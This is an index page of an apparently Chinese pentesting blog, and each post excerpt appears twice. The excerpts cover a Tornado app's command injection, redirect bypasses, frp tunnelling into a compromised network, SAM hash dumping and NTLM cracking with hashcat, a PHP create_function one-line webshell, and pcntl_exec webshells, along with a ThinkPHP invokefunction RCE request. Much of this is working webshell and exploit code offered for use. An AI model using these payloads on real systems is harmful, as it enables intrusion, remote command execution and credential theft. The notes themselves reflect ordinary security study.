	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/06/18/tornado-pentest.html" >记一次测试Tornado</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-06-18  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>常见越权测试完了之后，有一个上传文件的地方，上传的文件名存在反射xss，主要记录下任意文件读取和远程命令执行。</p>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ol>
<li><p>刚开始测试任意文件读取的时候，找不到要读取的文件，问了开发目录结构才读出来，好蠢。实际可以通过<code>/proc/self/cmdline</code> 查看当前程序的运行参数，可以获取到源代码文件名。</p>
</li>
<li><p>一般python开发的时候，根目录可能存在文件: <code>README.md</code>,<code>requirements.txt</code>,<code>app.py</code>,<code>.git/config</code>之类的文件</p>
</li>
</ol>
<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>读取到源代码之后，中间有不一部分的代码是这样的，接收请求传过来的参数，然后列目录:</p>
<pre class="line-numbers language-none"><code class="language-none">res &#x3D; exec_cmd4(&quot;ls -l %s|awk &#39;&#123;print $5&#125;&#39;&quot; % abs_file_name)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>exec_cmd4是开发自己写的函数，通过任意文件读取可以找到函数定义:</p>
<pre class="line-numbers language-none"><code class="language-none">def exec_cmd4(cmd, no_print&#x3D;False):    
	if not no_print:        
		logger.debug(cmd)    
		p &#x3D; subprocess.Popen(cmd, executable&#x3D;\&quot;&#x2F;bin&#x2F;bash\&quot;, shell&#x3D;True, stderr&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE)    
		return p.communicate();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里存在命令注入漏洞，链接: <a target="_blank" rel="noopener" href="https://strcpy.me/index.php/archives/787/">https://strcpy.me/index.php/archives/787/</a></p>
<p>抄一下demo代码:</p>
	

	</div>
  <a type="button" href="/2019/06/18/tornado-pentest.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>常见越权测试完了之后，有一个上传文件的地方，上传的文件名存在反射xss，主要记录下任意文件读取和远程命令执行。</p>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ol>
<li><p>刚开始测试任意文件读取的时候，找不到要读取的文件，问了开发目录结构才读出来，好蠢。实际可以通过<code>/proc/self/cmdline</code> 查看当前程序的运行参数，可以获取到源代码文件名。</p>
</li>
<li><p>一般python开发的时候，根目录可能存在文件: <code>README.md</code>,<code>requirements.txt</code>,<code>app.py</code>,<code>.git/config</code>之类的文件</p>
</li>
</ol>
<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>读取到源代码之后，中间有不一部分的代码是这样的，接收请求传过来的参数，然后列目录:</p>
<pre class="line-numbers language-none"><code class="language-none">res &#x3D; exec_cmd4(&quot;ls -l %s|awk &#39;&#123;print $5&#125;&#39;&quot; % abs_file_name)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>exec_cmd4是开发自己写的函数，通过任意文件读取可以找到函数定义:</p>
<pre class="line-numbers language-none"><code class="language-none">def exec_cmd4(cmd, no_print&#x3D;False):    
	if not no_print:        
		logger.debug(cmd)    
		p &#x3D; subprocess.Popen(cmd, executable&#x3D;\&quot;&#x2F;bin&#x2F;bash\&quot;, shell&#x3D;True, stderr&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE)    
		return p.communicate();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里存在命令注入漏洞，链接: <a target="_blank" rel="noopener" href="https://strcpy.me/index.php/archives/787/">https://strcpy.me/index.php/archives/787/</a></p>
<p>抄一下demo代码:</p>
	
	</div>
  <a type="button" href="/2019/06/18/tornado-pentest.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/05/27/web-url-hacking.html" >Web的URL Hacking</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-05-27  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>碰到一个任意URL跳转漏洞，第一次测的时候居然没有测出来，记录下笔记，以下是绕过的方式:</p>
<h3 id="0x01-小老鼠跳转绕过"><a href="#0x01-小老鼠跳转绕过" class="headerlink" title="0x01: 小老鼠跳转绕过"></a>0x01: 小老鼠跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589534351266.jpg"></p>
<h3 id="0x02-跳转绕过"><a href="#0x02-跳转绕过" class="headerlink" title="0x02: ?跳转绕过"></a>0x02: ?跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589535373195.jpg"></p>
<h3 id="0x03-绕过"><a href="#0x03-绕过" class="headerlink" title="0x03: #绕过"></a>0x03: #绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537014838.jpg"></p>
<h3 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04: /绕过"></a>0x04: /绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537987606.jpg"></p>
<h3 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05: \绕过"></a>0x05: \绕过</h3>
	

	</div>
  <a type="button" href="/2019/05/27/web-url-hacking.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>碰到一个任意URL跳转漏洞，第一次测的时候居然没有测出来，记录下笔记，以下是绕过的方式:</p>
<h3 id="0x01-小老鼠跳转绕过"><a href="#0x01-小老鼠跳转绕过" class="headerlink" title="0x01: 小老鼠跳转绕过"></a>0x01: 小老鼠跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589534351266.jpg"></p>
<h3 id="0x02-跳转绕过"><a href="#0x02-跳转绕过" class="headerlink" title="0x02: ?跳转绕过"></a>0x02: ?跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589535373195.jpg"></p>
<h3 id="0x03-绕过"><a href="#0x03-绕过" class="headerlink" title="0x03: #绕过"></a>0x03: #绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537014838.jpg"></p>
<h3 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04: /绕过"></a>0x04: /绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537987606.jpg"></p>
<h3 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05: \绕过"></a>0x05: \绕过</h3>
	
	</div>
  <a type="button" href="/2019/05/27/web-url-hacking.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/05/08/frps.html" >frps的socks5代理</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-05-08  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
<pre class="line-numbers language-none"><code class="language-none">frps.ini: 

[common]
bind_port &#x3D; 10086
privilege_token &#x3D; [passwd]
max_pool_count &#x3D; 50
dashboard_port &#x3D; [port]
dashboard_user &#x3D; [user]
dashboard_pwd &#x3D; [password]
use_encryption &#x3D; true
use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
<pre class="line-numbers language-none"><code class="language-none">frpc.ini

[common]
server_addr &#x3D; [vps ip]
server_port &#x3D; 10086
privilege_token &#x3D; [passwd]
max_pool_count &#x3D; 50


[socks5]
type &#x3D; tcp
remote_port &#x3D; [port]
plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>

	

	</div>
  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
<pre class="line-numbers language-none"><code class="language-none">frps.ini: 

[common]
bind_port &#x3D; 10086
privilege_token &#x3D; [passwd]
max_pool_count &#x3D; 50
dashboard_port &#x3D; [port]
dashboard_user &#x3D; [user]
dashboard_pwd &#x3D; [password]
use_encryption &#x3D; true
use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
<pre class="line-numbers language-none"><code class="language-none">frpc.ini

[common]
server_addr &#x3D; [vps ip]
server_port &#x3D; 10086
privilege_token &#x3D; [passwd]
max_pool_count &#x3D; 50


[socks5]
type &#x3D; tcp
remote_port &#x3D; [port]
plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>

	
	</div>
  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/04/02/OSCP-experience.html" >OSCP经验</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-04-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
uth-user-pass auth.txt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
<p>具体网络不稳定有两个表现:</p>
<ol>
<li>nmap扫描全部的端口长时间没有反应.</li>
<li>dirbuster扫描的时候会卡死进行不下去了.</li>
</ol>
<p>上面两个问题有两个解决方法:</p>
<ol>
<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
</ol>
<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
	

	</div>
  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
uth-user-pass auth.txt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
<p>具体网络不稳定有两个表现:</p>
<ol>
<li>nmap扫描全部的端口长时间没有反应.</li>
<li>dirbuster扫描的时候会卡死进行不下去了.</li>
</ol>
<p>上面两个问题有两个解决方法:</p>
<ol>
<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
</ol>
<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
	
	</div>
  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/03/01/hashcat.html" >Hashcat笔记</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-03-01  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>在windows里面任意读取的文件，找到了sam.old文件和system.old文件，读取之后用burp保存到文件，可以使用如下的命令来提取密码:</p>
<pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedump
usage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;

root@kali:~# lsadump
usage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;

root@kali:~# pwdump
usage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;

或者mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>提取的格式大概是这样:</p>
<pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system sam
Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>用户名称是:Administrator<br>RID是: 500<br>LM-HASH值: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)值: 1896d0a309184775f67c14d14b5c365a</p>
<p>可以使用hashcat来跑密码:</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>其中的hash.txt 可以指的是上面的NT-HASH。</p>
<pre class="line-numbers language-none"><code class="language-none">-m 1000 hash的类型，这里是NTLM
-a 0  0表示词典碰撞，这里是kali自带的辞典，还有3表示使用GPU来爆破，不用指定词典。
--force 忽略无显卡，直接跑
hash.txt 就是上面的NT-HASH
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
</li>
</ul>
	

	</div>
  <a type="button" href="/2019/03/01/hashcat.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>在windows里面任意读取的文件，找到了sam.old文件和system.old文件，读取之后用burp保存到文件，可以使用如下的命令来提取密码:</p>
<pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedump
usage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;

root@kali:~# lsadump
usage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;

root@kali:~# pwdump
usage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;

或者mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>提取的格式大概是这样:</p>
<pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system sam
Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>用户名称是:Administrator<br>RID是: 500<br>LM-HASH值: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)值: 1896d0a309184775f67c14d14b5c365a</p>
<p>可以使用hashcat来跑密码:</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>其中的hash.txt 可以指的是上面的NT-HASH。</p>
<pre class="line-numbers language-none"><code class="language-none">-m 1000 hash的类型，这里是NTLM
-a 0  0表示词典碰撞，这里是kali自带的辞典，还有3表示使用GPU来爆破，不用指定词典。
--force 忽略无显卡，直接跑
hash.txt 就是上面的NT-HASH
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
</li>
</ul>
	
	</div>
  <a type="button" href="/2019/03/01/hashcat.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/01/10/create_function.html" >create_function</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-01-10  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
  eval(&quot;
    function lambda_1 ($args) &#123; $code &#125;
  &quot;);
  return &#39;lambda_1&#39;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
	

	</div>
  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
  eval(&quot;
    function lambda_1 ($args) &#123; $code &#125;
  &quot;);
  return &#39;lambda_1&#39;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
	
	</div>
  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/12/18/pcntl_exec.html" >pcntl_exec</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-12-18  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>2019.8.1更新</p>
<p>这样子执行完就不会多出来<defunc>的进程，也不会多出来<code>php-fpm</code>进程:</defunc></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php

&#x2F;**
 * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程
 *&#x2F;

&#x2F;&#x2F;生成子进程
$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
$pid &#x3D; pcntl_fork();
if($pid &#x3D;&#x3D; -1)&#123;
    die(&#39;could not fork&#39;);
&#125;else&#123;
    if($pid)&#123;
        $status &#x3D; 0;
        pcntl_exec($cmd[0], $cmd[1]);
        posix_kill(getmypid(),9);
&#x2F;&#x2F;阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
        &#x2F;&#x2F;可使用pcntl_wait($status, WNOHANG)实现非阻塞式

        pcntl_wait($status);
        exit;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
<p><strong>执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)</strong></p>
<hr>
<pre class="line-numbers language-none"><code class="language-none">参数执行:
pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;返回值可能是502

执行脚本:
pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;返回值502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">返回值200
&lt;?php
$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
if(function_exists(&#39;pcntl_exec&#39;)) &#123;
    switch(pcntl_fork())&#123;
     case 0:
        pcntl_exec($cmd[0], $cmd[1]);
    default:
          echo &quot;case 111&quot;;
    &#125;
&#125; else &#123;
        echo &#39;不支持pcntl扩展&#39;;
&#125;
?&gt;


cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt

&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">
&lt;?php
header(&quot;Content-Type: text&#x2F;plain&quot;);
$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;
@unlink($cmd);
@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);
$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;
file_put_contents($cmd, $c);
chmod($cmd, 0777);

switch (pcntl_fork()) &#123;
  case 0:
    $ret &#x3D; pcntl_exec($cmd);
    exit(&quot;case 0&quot;);
  default:
    echo &quot;case 1&quot;;
    break;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面执行的脚本那行chmod不可以少</p>
	

	</div>
  <a type="button" href="/2018/12/18/pcntl_exec.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>2019.8.1更新</p>
<p>这样子执行完就不会多出来<defunc>的进程，也不会多出来<code>php-fpm</code>进程:</defunc></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php

&#x2F;**
 * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程
 *&#x2F;

&#x2F;&#x2F;生成子进程
$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
$pid &#x3D; pcntl_fork();
